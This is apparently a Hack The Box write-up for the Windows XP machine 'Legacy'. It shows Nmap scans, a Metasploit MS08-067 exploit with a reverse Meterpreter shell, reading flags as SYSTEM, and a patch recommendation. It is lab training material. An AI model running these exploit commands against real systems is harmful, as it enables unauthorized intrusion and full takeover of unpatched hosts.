## ⚙️ Machine Info:

- **Name**: Legacy
- **IP**: `10.10.10.4`
- **OS**: [Windows XP SP3](Windows)
- **Difficulty**: [Easy](Easy)
- **Exploits Used**:
    - [SMB](SMB) vulnerability: **MS08-067 (CVE-2008-4250)** — Remote Code Execution
- **Tools**:
    - [Nmap](https://nmap.org/)
    - [Metasploit](https://www.metasploit.com/)
    - [Meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)

---

## 🔍 Recon

### 📌 Add to `/etc/hosts`

```bash
echo "10.10.10.4 legacy.htb" | sudo tee -a /etc/hosts
```

### 🔎 Nmap Full TCP Scan

```bash
nmap -sC -sV -p- -Pn -T4 legacy.htb
```

### 🔐 Vulnerability Scan (Targeted SMB Ports)

```bash
nmap -p 135,139,445 -sT -A -O -sV -sC --script vuln -Pn -T4 legacy.htb
```

✅ **Findings**: Vulnerable to [CVE-2008-4250](https://nvd.nist.gov/vuln/detail/CVE-2008-4250) – MS08-067 (Server Service Vulnerability)

---

## 💥 Exploitation

### 🚀 Launch Metasploit

```bash
msfconsole -q
```

### 🔍 Search for Exploit

```bash
search CVE-2008-4250
```

✅ Use: `exploit/windows/smb/ms08_067_netapi`

### 🛠️ Configure Payload

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set LHOST tun0
run
```

---

## 🐚 Meterpreter Shell

### 🎉 Confirm Access

```bash
getuid
```

✅ Output: `NT AUTHORITY\SYSTEM`

### 📁 Navigate to Flags

```shell
cd "Documents and Settings/john/Desktop"
type user.txt

cd ../../Administrator/Desktop
type root.txt
```

---

## 🛡️ Mitigation

> **Patch Recommendation**:  
> Apply [Microsoft Security Bulletin MS08-067](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067) to fix the remote code execution vulnerability in the Server service. This update is **critical** for Windows XP, 2000, and 2003 systems.

---

## 🧠 Actions Learned from This Box

- Importance of **patching legacy systems** 🩹
- SMB port enumeration using Nmap
- Exploiting Windows vulnerabilities using **Metasploit**
- Using `Meterpreter` for privilege access and system exploration
- CVE identification and mitigation strategy 📚

---

## 🔗 References

- [NVD — CVE-2008–4250](https://nvd.nist.gov/vuln/detail/CVE-2008-4250)
- [MITRE — CVE-2008–4250](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250)
- [MS08-067 Microsoft Security Bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067)
